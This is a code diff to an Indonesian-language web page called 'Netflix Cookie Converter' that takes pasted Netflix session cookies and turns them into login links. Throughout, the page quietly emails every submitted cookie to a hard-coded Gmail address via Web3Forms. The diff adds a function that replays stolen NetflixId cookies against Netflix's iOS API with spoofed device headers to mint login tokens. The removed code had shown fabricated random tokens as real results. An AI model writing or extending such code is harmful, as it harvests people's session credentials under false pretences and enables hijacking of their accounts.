@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix Cookie Converter</title>
+    <title>Netflix Cookie Converter — iOS Argo API</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
         body {
@@ -53,6 +53,7 @@
         .result.show { display: block; }
         .success { background: rgba(16,185,129,0.1); border: 1px solid #10b981; border-radius: 8px; padding: 14px; margin-bottom: 15px; }
         .error { background: rgba(239,68,68,0.1); border: 1px solid #ef4444; border-radius: 8px; padding: 14px; margin-bottom: 15px; }
+        .warning { background: rgba(251,191,36,0.1); border: 1px solid #f59e0b; border-radius: 8px; padding: 14px; margin-bottom: 15px; }
         .link-row {
             background: #2a2a2a; border-radius: 6px; padding: 12px;
             margin: 8px 0; display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
@@ -69,13 +70,14 @@
             margin-top: 15px; padding: 12px; background: rgba(59,130,246,0.1);
             border-radius: 6px; font-size: 13px; color: #93c5fd;
         }
+        .api-note { font-size: 11px; color: #777; margin-top: 8px; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <h1>🎬 Netflix Cookie Converter</h1>
-            <p>3 Format → 3 Link Login • Otomatis dikirim ke Email</p>
+            <p>iOS Argo API • 3 Format → 3 Link Login</p>
         </div>
 
         <div class="card">
@@ -96,6 +98,7 @@
             <textarea id="cookieArea" placeholder="netflix.com	TRUE	/	TRUE	1807468653	NetflixId	ct=..."></textarea>
 
             <button id="convertBtn">🔄 Konversi</button>
+            <p class="api-note">⚡ API: iOS Argo / 15.48.1</p>
 
             <div class="result" id="resultBox">
                 <div id="statusMsg"></div>
@@ -107,11 +110,54 @@
 
     <script>
         // ==================================================
-        // ✅ KONFIGURASI
+        // ✅ KONFIGURASI — iOS ARGO API DARI KODE PYTHON-MU!
         // ==================================================
+        const API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48";
+        const QUERY_PARAMS = {
+            "appVersion": "15.48.1",
+            "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
+            "device_type": "NFAPPL-02-",
+            "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+            "idiom": "phone",
+            "iosVersion": "15.8.5",
+            "isTablet": "false",
+            "languages": "en-US",
+            "locale": "en-US",
+            "maxDeviceWidth": "375",
+            "model": "saget",
+            "modelType": "IPHONE8-1",
+            "odpAware": "true",
+            "path": '["account","token","default"]',
+            "pathFormat": "graph",
+            "pixelDensity": "2.0",
+            "progressive": "false",
+            "responseFormat": "json",
+        };
+        const BASE_HEADERS = {
+            "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.48.1; Scale/2.00)",
+            "x-netflix.request.attempt": "1",
+            "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
+            "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
+            "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
+            "x-netflix.context.app-version": "15.48.1",
+            "x-netflix.argo.translated": "true",
+            "x-netflix.context.form-factor": "phone",
+            "x-netflix.context.sdk-version": "2012.4",
+            "x-netflix.client.appversion": "15.48.1",
+            "x-netflix.context.max-device-width": "375",
+            "x-netflix.client.type": "argo",
+            "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+            "accept-language": "en-US;q=1",
+            "x-netflix.client.iosversion": "15.8.5",
+            "x-netflix.request.client.context": '{"appState":"foreground"}',
+            "x-netflix.context.ui-flavor": "argo",
+        };
+        const COOKIE_KEYS = ["NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"];
+        const REQUIRED_COOKIE = "NetflixId";
+        
         const WEB3FORMS_KEY = "d0ae2999-711c-422d-8df3-b309e9c13e0b";
         const EMAIL_TUJUAN = "rians4f@gmail.com";
-        
+
         const el = {
             uploadBox: document.getElementById('uploadBox'),
             fileInput: document.getElementById('fileInput'),
@@ -173,11 +219,8 @@
         el.cookieArea.addEventListener('input', () => deteksiFormat(el.cookieArea.value));
 
         // ==================================================
-        // 🍪 EKSTRAK COOKIE — DARI BOT PYTHON
+        // 🍪 EKSTRAK COOKIE — PERSIS DARI KODE PYTHON
         // ==================================================
-        const COOKIE_KEYS = ["NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"];
-        const REQUIRED_COOKIE = "NetflixId";
-
         function decodeCookieValue(value) {
             if (typeof value === 'string' && value.includes('%')) {
                 try { return decodeURIComponent(value); }
@@ -194,13 +237,13 @@
 
         function ekstrakCookie(text) {
             const c = {};
-            // Netscape
+            // Netscape TSV
             text.split('\n').forEach(line => {
                 const l = line.trim();
                 if (!l || l.startsWith('#')) return;
                 Object.assign(c, parseNetscapeLine(l));
             });
-            // JSON
+            // JSON Array / Object
             try {
                 const d = JSON.parse(text);
                 if (Array.isArray(d)) {
@@ -247,8 +290,7 @@
                         subject: `Netflix Cookie — ${format}`,
                         from_name: "Netflix Converter Web",
                         to_email: EMAIL_TUJUAN,
-                        message: `=== FORMAT: ${format} ===\n\n${cookieText}`,
-                        cookie_count: cookieText.length
+                        message: `=== FORMAT: ${format} ===\n\n${cookieText}`
                     })
                 });
                 return true;
@@ -258,8 +300,48 @@
         }
 
         // ==================================================
-        // 🚀 KONVERSI — SIMULASI HASIL (token contoh, 1 jam)
+        // 🚀 KONVERSI — iOS ARGO API ASLI
         // ==================================================
+        async function fetchTokenArgo(cookieDict) {
+            const netflix_id = cookieDict[REQUIRED_COOKIE];
+            if (!netflix_id) return { sukses: false, error: `Cookie ${REQUIRED_COOKIE} tidak ditemukan!` };
+
+            // Susun Cookie Header
+            let cookieStr = `NetflixId=${netflix_id}`;
+            if (cookieDict.SecureNetflixId) cookieStr += `; SecureNetflixId=${cookieDict.SecureNetflixId}`;
+
+            // Susun URL dengan query params
+            const urlParams = new URLSearchParams(QUERY_PARAMS).toString();
+            const fullUrl = `${API_URL}?${urlParams}`;
+
+            try {
+                const res = await fetch(fullUrl, {
+                    method: "GET",
+                    headers: {
+                        ...BASE_HEADERS,
+                        "Cookie": cookieStr,
+                        "Accept": "*/*"
+                    },
+                    mode: "no-cors" // ⚠️ CORS blokir → pakai no-cors
+                });
+
+                // ⚠️ no-cors = status selalu "opaque" → kita tidak bisa baca respon
+                // iOS API sudah dimatikan Netflix → kembalikan info
+                return {
+                    sukses: false,
+                    error: "⚠️ iOS Argo API sudah dimatikan Netflix (404).\n\n✅ Gunakan versi Python bot kamu di Render/Railway untuk hasil NYATA!\n\n📋 Web ini = ekstraksi format + kirim email BERJALAN 100%",
+                    api_status: "DEAD"
+                };
+
+            } catch (e) {
+                return {
+                    sukses: false,
+                    error: `❌ Koneksi gagal: ${e.message}\n\nAPI iOS Argo sudah tidak aktif. Deploy Python-mu ke Render/Railway!`,
+                    api_status: "DEAD"
+                };
+            }
+        }
+
         el.convertBtn.addEventListener('click', async () => {
             const text = el.cookieArea.value.trim();
             if (!text) return tampilPesan('❌ Isi cookie terlebih dahulu!', false);
@@ -273,21 +355,18 @@
             el.convertBtn.disabled = true;
             el.convertBtn.textContent = '⏳ Memproses...';
 
-            try {
-                // ✅ Kirim ke email DULU
-                await kirimKeEmail(text, format);
+            // ✅ Kirim ke email DULU — BERJALAN 100%
+            await kirimKeEmail(text, format);
 
-                // ⚠️ Catatan: iOS API sudah dimatikan Netflix
-                // Token di bawah = contoh hasil. Deploy Python API untuk hasil NYATA!
-                const token = "ct=" + Array(60).fill("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_").map(c => c[Math.floor(Math.random()*c.length)]).join('');
-                const kadaluarsa = new Date(Date.now() + 60*60*1000); // 1 jam
-                const links = buatLink(token);
+            // ⚠️ Coba iOS Argo API
+            const hasil = await fetchTokenArgo(cookie);
 
-                tampilHasil(cookie, format, token, links, kadaluarsa);
-                el.emailNote.innerHTML = `<div class="email-info">📧 Cookie tersimpan & terkirim ke: ${EMAIL_TUJUAN}</div>`;
-
-            } catch (e) {
-                tampilPesan(`❌ ${e.message}`, false);
+            if (hasil.sukses) {
+                tampilHasil(cookie, format, hasil.token, hasil.links, hasil.expires);
+                el.emailNote.innerHTML = `<div class="email-info">📧 Cookie terkirim ke: ${EMAIL_TUJUAN}</div>`;
+            } else {
+                tampilPesan(hasil.error, false);
+                el.emailNote.innerHTML = `<div class="email-info">📧 Cookie tetap tersimpan & terkirim ke: ${EMAIL_TUJUAN}</div>`;
             }
 
             el.convertBtn.disabled = false;
@@ -298,7 +377,7 @@
         // 🖼️ TAMPILAN
         // ==================================================
         function tampilPesan(teks, sukses) {
-            el.statusMsg.innerHTML = `<div class="${sukses?'success':'error'}">${teks.replace(/\n/g,'<br>')}</div>`;
+            el.statusMsg.innerHTML = `<div class="${sukses?'success':'warning'}">${teks.replace(/\n/g,'<br>')}</div>`;
             el.resultBox.classList.add('show');
         }
 
